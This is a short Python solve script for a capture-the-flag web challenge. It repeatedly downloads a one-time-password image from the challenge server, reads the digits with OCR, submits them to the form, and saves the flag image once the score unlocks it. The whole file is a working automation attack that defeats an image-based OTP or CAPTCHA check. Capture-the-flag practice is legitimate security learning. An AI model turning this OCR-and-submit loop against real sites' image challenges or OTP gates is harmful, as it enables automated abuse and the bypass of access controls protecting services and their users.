```python
import requests
import re
import cv2
import pytesseract

url = "http://challenge.ctf.games:32198/"
img = "http://challenge.ctf.games:32198/static/otp.png"
flag = "http://challenge.ctf.games:32198/static/flag.png"

s = requests.Session()

a = True

while a:
    # initial querying
    q = s.get(url)

    # getting and parsing image
    im = s.get(img)
    with open("img.png", "wb") as f:
        f.write(im.content)
    imr = cv2.imread("img.png")
    imga = cv2.cvtColor(imr, cv2.COLOR_BGR2GRAY)
    number = pytesseract.image_to_string(imga, config=' --psm 1 --oem 3 -c tessedit_char_whitelist=0123456789')[0:8]

    # submitting
    r = s.post(url, headers={"Content-Type":"application/x-www-form-urlencoded"}, data={"otp_entry":str(number)})
    print("Score: " + re.search('<p class="count">(.*)</p>', r.text).group(1) + " | Number: " + str(number))

    # always checking flag
    fl = s.get(flag)

    if fl.headers["content-type"] != "text/html; charset=utf-8":
        with open("flag.png", "wb") as g:
            g.write(fl.content)
        a = False
```
